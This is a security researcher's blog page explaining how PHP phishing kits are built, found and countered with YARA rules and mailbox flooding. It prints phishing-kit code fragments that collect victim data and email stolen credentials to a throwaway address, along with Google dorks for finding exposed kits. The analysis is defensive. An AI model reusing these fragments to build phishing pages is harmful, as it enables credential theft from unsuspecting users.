<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="">
    <meta name="description" content="Phishkits. What they are, where to find them, and how to defend against them. Plus a little bit of knowledge found on the underground.">
    <meta name="copyright" content="Chad Baxter">
    <meta name="language" content="EN">
    <meta name="robots" content="index,follow" >
    <meta name="designer" content="Chad Baxter">
    <meta name="owner" content="Chad Baxter">
    <meta name="url" content="https://computeco.de">
    <meta name="identifier-URL" content="https://computeco.de">
    <meta name="directory" content="submission">
    <meta name="coverage" content="Worldwide">
    <meta name="distribution" content="Global">
    <meta name="rating" content="General">

    <title>ComputeCode</title>

    <link rel="stylesheet" href="/style/base.css">

  </head>
  <body>
    <header class="navbar">
      <section class="navbar-section">
        <a href="/" class="navbar-brand mr-2"><h1 class="title">ComputeCode</h1></a>
      </section>
      <section class="navbar-section">
        <a href="/" class="btn btn-link">Home</a>
        <a href="https://keybase.io/mrcbax" class="btn btn-link">Keybase</a>
        <a href="https://github.com/LogoiLab" class="btn btn-link">GitHub</a>
         <a href="/rss.xml" class="btn"><?xml version="1.0" encoding="UTF-8"?>
                    <svg height="1em" width="1em" style="fill: #dcdcdc;"><?xml version="1.0" encoding="iso-8859-1"?><svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 448 448" style="enable-background:new 0 0 448 448;" xml:space="preserve"><g><g><circle cx="64" cy="384" r="64"/></g></g><g><g><path d="M0,149.344v85.344c117.632,0,213.344,95.68,213.344,213.312h85.312C298.656,283.328,164.672,149.344,0,149.344z"/></g></g><g><g><path d="M0,0v85.344C200,85.344,362.688,248,362.688,448H448C448,200.96,247.04,0,0,0z"/></g></g></svg>
</svg>
                </a>
      </section>
    </header>
    <div class="container">
      <div class="columns">
        <div class="column col-3">
          <div class="card">
            <div class="post-content">
              <div class="card-title h1">Links</div>
              <div class="card-body">
                <a class="spacebar">​​﻿​​﻿﻿﻿​﻿​​﻿​﻿﻿﻿​​﻿​﻿​﻿​​﻿﻿​​﻿﻿﻿﻿﻿​﻿﻿﻿﻿﻿​​﻿​﻿﻿​​﻿﻿﻿​﻿﻿​﻿​﻿﻿﻿</a>
                <br>
                <a href="https://peegeepee.com/B6E62A011FB6F1D7C80618DC51F5CC26A52396FC" class="card-title h5">PGP: 51F5 CC26 A523 96FC</a>
                <br>
                <a href="https://doslabelectronics.com" class="card-title h5">DosLab Electronics</a>
                <br>
                <a href="/assets/feedlist.opml" class="card-title h5">Security FeedList</a>
                <br>
                <a class="spacebar">​​﻿​​﻿﻿﻿​﻿​​﻿​﻿﻿﻿​​﻿​﻿​﻿​​﻿﻿​​﻿﻿﻿﻿﻿​﻿﻿﻿﻿﻿​​﻿​﻿﻿​​﻿﻿﻿​﻿﻿​﻿​﻿﻿﻿</a>
              </div>
            </div>
          </div>
        </div>
        <div class="column col-9">
          <div class="card">
            <div class="post-content">
              <div class="card-title h1">ActiveAntiPhish - Protecting Stolen Credentials Using Saturation</div>
              <div class="card-body">
                <a class="spacebar">​​﻿​​﻿﻿﻿​﻿​​﻿​﻿﻿﻿​​﻿​﻿​﻿​​﻿﻿​​﻿﻿﻿﻿﻿​﻿﻿﻿﻿﻿​​﻿​﻿﻿​​﻿﻿﻿​﻿﻿​﻿​﻿﻿﻿</a>
                <h3>Background</h3>
<p>Over the past week I've started a new project involving phishing kits. These nasty little things are usually zip files that a hacker has paid for on an underground website or forum. They take many forms and are used to phish for many different​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ types of credentials. Most phishers target the end user by sending an email that looks like it comes from the company with which they have an account when in fact the link in the email is a link to a phishing kit.</p>
<p>These kits are all created in PHP and all have the same coding style. It seems the underground phishing community has a standard they think is best which they follow faithfully. Because there are <em>thousands</em> of different versions of these kits I thought it would be hard​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ to write a good YARA rule to detect them. Turns out this &quot;tried and true&quot; format persists across almost 90% of them.</p>
<p>With <a href="https://www.github.com/LogoiLab/ActiveAntiPhish">ActiveAntiPhish</a> my goal is to create an application that allows for easy detection of phishing kits found on your servers as well as those that show up in your emails. If you were to somehow accidentally input your​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ credentials into a phishing kit ActiveAntiPhish's goal is to make it really hard for the phisher to use those credentials.</p>
<h3>PhishKit Design</h3>
<p>A phishing kit is commonly comprised of three parts, the <em>index</em>, the <em>blocker</em>, and the <em>mailer</em>.</p>
<h4>The Index</h4>
<p>The index page is usually a cloned page of the target website with the form fields changed to point to the <em>mailer</em>. For simple accounts these files are generally single page in style with a redirect to the official site. For banking phishkits the <em>index</em> may be three to four separate pages for grabbing things like routing number, account number, pins, credit card info, and more.</p>
<h4>The Blocker</h4>
<p>Copy-pasting is virulent in the phishing community. The blocking script is the most common code among phishkits. This simple PHP script uses things like headers and user agent strings to determine if the computer visiting the page is a bot. The most commonly blocked bots are those by security companies and anti-phishing efforts like <a href="https://phishtank.com/">PhishTank</a>. Often phishers block entire IP ranges of countries they do not want credentials from. These vary based on the phisher.</p>
<h4>The Mailer</h4>
<p>This chunk of code is the main interest of ActiveAntiPhish as it is what exfiltrates stolen user info. It commonly has four parts with another debug-like part that shows up occasionally.</p>
<p>The first part gathers info about the user such as IP, country of origin, and User Agent string. An example of this section can be found here:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">$country = visitor_country();
</span><span style="color:#d0c8c6;">$ip = getenv(&quot;REMOTE_ADDR&quot;);
</span><span style="color:#d0c8c6;">$_SESSION[&#39;UserName&#39;] = $_POST[&#39;UserName&#39;];
</span><span style="color:#d0c8c6;">$port = getenv(&quot;REMOTE_PORT&quot;);
</span><span style="color:#d0c8c6;">$browser = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
</span><span style="color:#d0c8c6;">$adddate=date(&quot;D M d, Y g:i a&quot;);
</span></pre>
<p><code>visitor_country()</code> in this case is a function that uses publicly available geolocation APIs to get the victim's country of origin.</p>
<p>The second part creates the log, this compiles all of the gathered info including the stolen credentials into a multi-line PHP string. This log contains lots of identifiable strings and is usually what ActiveAntiPhish uses to identify the <em>mailer</em>. An example log section:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">$message .= &quot;-----------  ! +Citi LOGIN ! xDD+ !  -----------\n&quot;;
</span><span style="color:#d0c8c6;">$message .= &quot;-----------  ! +Account infoS+ !  -----------\n&quot;;
</span><span style="color:#d0c8c6;">$message .= &quot;Email Address        : &quot;.$_POST[&#39;username&#39;].&quot;\n&quot;;
</span><span style="color:#d0c8c6;">$message .= &quot;Password               : &quot;.$_POST[&#39;passwd&#39;].&quot;\n&quot;;
</span><span style="color:#d0c8c6;">$message .= &quot;IP Address             : &quot;.$ip.&quot;\n&quot;;
</span><span style="color:#d0c8c6;">$message .= &quot;-----------  ! +nJoY+ !  -----------\n&quot;;
</span></pre>
<p>Phishers like to tag their logs for an unknown reason. These tags are very identifiable. The structure of dashes with tags in the middle is common among all <em>mailers</em>. The YARA rules currently in use by ActiveAntiPhish trigger on this format as well as unique tags.</p>
<p>The third part is where the <em>mailer</em> gets its name. It composes the headers and addresses to send an email to a throwaway account that the phisher controls. It looks a little something like this:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">$send = &quot;REDACTED@gmail.com&quot;;
</span><span style="color:#d0c8c6;">$subject = &quot;Office365 logs xD $ip&quot;;
</span><span style="color:#d0c8c6;">$headers = &quot;From:  El Patr0n&lt;</span><span style="color:#cb6077;">xCoNsoLe</span><span style="color:#d0c8c6;">@REDACTED.com&gt;&quot;;
</span><span style="color:#d0c8c6;">$headers .= $_POST[&#39;eMailAdd&#39;].&quot;\n&quot;;
</span><span style="color:#d0c8c6;">$headers .= &quot;MIME-Version: 1.0\n&quot;;
</span><span style="color:#d0c8c6;">$arr=array($send, $IP);
</span><span style="color:#d0c8c6;">foreach ($arr as $send)
</span><span style="color:#d0c8c6;">mail($send,$subject,$message,$headers);
</span></pre>
<p>As you can see there are a lot of unique strings here, in fact phishers seem to like 1337SpEaK. This makes it easy to detect.</p>
<p>The fourth part is often the redirect. This is an attempt to make the phishing page look legit by either logging you into or forwarding you on to the homepage of the impersonated site:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">header(&quot;Location: https://login.microsoftonline.com/&quot;);
</span></pre>
<p>This part of the <em>mailer</em> is only helpful in identifying phishkits when used in conjunction with the above indicators.</p>
<p>The fifth and optional part is usually used to debug the mailer or is used as a fallback in case the throwaway account gets banned. It creates a local file and writes the log that would have been sent via email to the file. Phishkits that do this help us better understand who is being targeted as usually the log files are publicly readable. This allows me to contact those affected, especially those who had their corporate or university email stolen. The fallback option looks something like this:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">$handle = fopen(&quot;script.txt&quot;, &quot;a&quot;);
</span><span style="color:#d0c8c6;">fwrite($handle, $message);
</span><span style="color:#d0c8c6;">fclose($handle);
</span></pre><h3>PhishKit Collection</h3>
<p>The method I use for gathering phishkits is usually a list of Google dorks. <a href="https://phishtank.com/">PhishTank</a> is a good source if you're willing to hunt. Things to look for when hunting for phishkits are open directories with odd file and folder names. For example, here is a Google dork for Microsoft phishkits:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">intitle:&quot;Index of&quot; insite:&quot;onedrive&quot; &quot;.zip&quot;
</span></pre>
<p>Once you find one you can continue to find more by using filenames you find to be common. Another common Microsoft phishkit dork:</p>
<pre style="background-color:#3b3228;">
<span style="color:#d0c8c6;">intitle:&quot;Index of&quot; insite:&quot;m1cr0&quot; &quot;.zip&quot;
</span></pre>
<p>These dorks work because of the way phishers​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ exploit vulnerable web servers. Often times a phisher finds a way of uploading a PHP webshell, this can be through poorly implemented upload pages or exploits (looking at you revslider). They then use the webshell to upload a zip file of the phishkit. They later extract the zip file and their kit is ready to go. Most phishers forget to delete the zip file after they're done. This allows us to download a copy of their phishkit. We now know how to interact with their <em>mailer</em> script which allows us to automate saturation of the phisher's email account.</p>
<h3>Saturation</h3>
<p>Most throwaway accounts are GMail accounts the reason for this is unknown. But this allows us to make some educated gues​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ses as to the limits of the account. GMail only allows its users to receive about 60 emails per minute (or an email a second). ActiveAntiPhish will be able to saturate the phisher's account with ease simply by calling the <em>mailer</em> script. It is not known how GMail handles email flooding. But we can assume the server sending the email gets banned when it reaches the daily limit. That's 1 email a second, for every minute of 24 hours or <strong>86,400</strong> emails. Once we reach this point the GMail documentation is very clear that the server is banned for 24 hours for the first offense.</p>
<p>This is important because if the phisher does not have a fallback email or logfile they have lost the ability to collect logs for the day while also having their inbox full of fake credentials. This would​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿ give a targeted company or individual time to contact webhosts and domain registrars to get the phishing page taken down.</p>
<p>The whole point of saturation is to increase the noise in the signal to noise ratio. This makes it difficult for a phisher to verify stolen credentials, making it very likely for them to just abandon that email account. Because the fake traffic is generated by the site wit​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿h the <em>mailer</em> the computer running ActiveAntiPhish is not likely to get banned.</p>
<h3>Closing</h3>
<p>The indicators of compromise that can be gleaned from phishkits allow us to build robust YARA rules for detecting their p​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿resence on our networks. The rules used by ActiveAntiPhish can be found in the repo here: <a href="https://cpcde.page.link/aapr">phishkit.yar</a>.</p>
<p>ActiveAntiPhish is still under heavy development and is currently in the research phase. Any contributions are welcome. You ​﻿﻿﻿﻿﻿​﻿﻿﻿​﻿​﻿​​﻿﻿​​﻿﻿​​﻿​​​﻿﻿​﻿​﻿﻿﻿​​﻿​​﻿﻿​﻿﻿​​﻿﻿​﻿​﻿​﻿﻿﻿​​​​​﻿​﻿​​​﻿​﻿​​﻿​﻿​﻿﻿﻿﻿​​﻿​​​﻿​​​﻿﻿​﻿can find the repo <a href="https://cpcde.page.link/aap">HERE</a></p>
<h3>References</h3>
<p><a href="https://support.google.com/a/answer/1366776?hl=en">https://support.google.com/a/answer/1366776?hl=en</a></p>

                <a class="spacebar">​​﻿​​﻿﻿﻿​﻿​​﻿​﻿﻿﻿​​﻿​﻿​﻿​​﻿﻿​​﻿﻿﻿﻿﻿​﻿﻿﻿﻿﻿​​﻿​﻿﻿​​﻿﻿﻿​﻿﻿​﻿​﻿﻿﻿</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <footer class="navbar">
      <section class="navbar-section">
        <p>&copy;2023 Chad Baxter</p>
      </section>
      <section class="navbar-section">
        <a href="https://wigle.net">
          <img src="https://wigle.net/bi/Y6ICR7rJxQTG0P4BNmvkdA.png" loading="lazy" border="0">
        </a>
        <a href="https://www.abuseipdb.com/user/34877" title="AbuseIPDB is an IP address blacklist for webmasters and sysadmins to report IP addresses engaging in abusive behavior on their networks" alt="AbuseIPDB Contributor Badge">
          <img src="https://www.abuseipdb.com/contributor/34877.svg" loading="lazy" style="width: 200px;">
        </a>
      </section>
    </footer>
  </body>
</html>
